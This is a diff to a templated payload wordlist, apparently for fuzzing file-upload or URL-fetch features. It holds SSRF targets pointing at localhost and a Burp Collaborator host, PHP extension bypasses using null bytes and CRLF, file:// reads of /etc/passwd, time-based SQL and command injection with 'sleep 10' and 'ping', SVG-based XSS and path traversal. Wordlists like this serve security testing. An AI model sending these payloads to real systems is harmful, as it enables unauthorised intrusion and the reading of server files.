@@ -1,46 +1,46 @@
-https://localhost:6566/hello.log
-https://localhost/hello.log
-https://spoofed.burpcollaborator.net/hello.log
-https://127.0.0.1:6566/hello.log
-https://127.1:6566/hello.log
-https://127.0.0.1/hello.log
-https://127.1/hello.log
-https://{domain}/hello.{fileExtension}.php
-https://{domain}{fileName}.{fileExtension}.Php5
-https://{domain}{fileName}.php%20
-https://{domain}{fileName}.php%0a
-https://{domain}{fileName}.php%00
-https://{domain}{fileName}.php%0d%0a
-https://{domain}{fileName}.php/
-https://{domain}{fileName}.php.\
-https://{domain}{fileName}.
-https://{domain}{fileName}.php....
-https://{domain}{fileName}.pHp5....
-https://{domain}{fileName}.php
-https://{domain}{fileName}.png.pHp5
-https://{domain}{fileName}.php%00.{fileExtension}
-https://{domain}{fileName}.php\x00.{fileExtension}
-https://{domain}{fileName}.php%0a.{fileExtension}
-https://{domain}{fileName}.php%0d%0a.{fileExtension}
-https://{domain}{fileName}.phpJunk123{fileExtension}
+https://localhost:6566/{fileName}.png
+https://localhost/{fileName}.png
+https://spoofed.burpcollaborator.net/{fileName}.png
+https://127.0.0.1:6566/{fileName}.png
+https://127.1:6566/{fileName}.png
+https://127.0.0.1/{fileName}.png
+https://127.1/{fileName}.png
+https://{domain}/{fileName}.{fileExtension}.php
+https://{domain}/{fileName}.{fileExtension}.Php5
+https://{domain}/{fileName}.php%20
+https://{domain}/{fileName}.php%0a
+https://{domain}/{fileName}.php%00
+https://{domain}/{fileName}.php%0d%0a
+https://{domain}/{fileName}.php/
+https://{domain}/{fileName}.php.\
+https://{domain}/{fileName}.
+https://{domain}/{fileName}.php....
+https://{domain}/{fileName}.pHp5....
+https://{domain}/{fileName}.php
+https://{domain}/{fileName}.png.pHp5
+https://{domain}/{fileName}.php%00.{fileExtension}
+https://{domain}/{fileName}.php\x00.{fileExtension}
+https://{domain}/{fileName}.php%0a.{fileExtension}
+https://{domain}/{fileName}.php%0d%0a.{fileExtension}
+https://{domain}/{fileName}.phpJunk123{fileExtension}
 file://home/secret/carlos
 file://etc/passwd
 sleep(10)-- -.jpg
 <svg onload=alert(document.domain)>
 ; sleep 10;
-https://{domain}/hello.jpg; sleep 10;
-https://{domain}/hello.png; sleep 10;
+https://{domain}/{fileName}.jpg; sleep 10;
+https://{domain}/{fileName}.png; sleep 10;
 https://…:.jpg
 https://…:.png
-https://{domain}/|hello.jpg
-https://{domain}/<hello.jpg
-https://{domain}/>hello.jpg
-https://{domain}/*hello.jpg
-https://{domain}/?hello.jpg
-https://{domain}/"hello.jpg
-https://{domain}{fileName}?a=bbb||ping+-c+10+127.0.0.1||
-https://{domain}{fileName}?a=bbb; sleep 10;
-https://{domain}{fileName}; sleep 10;
-https://{domain}{fileName}<svg onload=alert(document.domain)>
-https://{domain}{fileName}../../../tmp/lol.png
-https://{domain}{fileName}/../../../tmp/lol.png
+https://{domain}/|{fileName}.jpg
+https://{domain}/{fileName}.jpg
+https://{domain}/>{fileName}.jpg
+https://{domain}/*{fileName}.jpg
+https://{domain}/?{fileName}.jpg
+https://{domain}/"{fileName}.jpg
+https://{domain}/{fileName}?a=bbb||ping+-c+10+127.0.0.1||
+https://{domain}/{fileName}?a=bbb; sleep 10;
+https://{domain}/{fileName}; sleep 10;
+https://{domain}/{fileName}<svg onload=alert(document.domain)>
+https://{domain}/{fileName}../../../tmp/lol.png
+https://{domain}/{fileName}/../../../tmp/lol.png
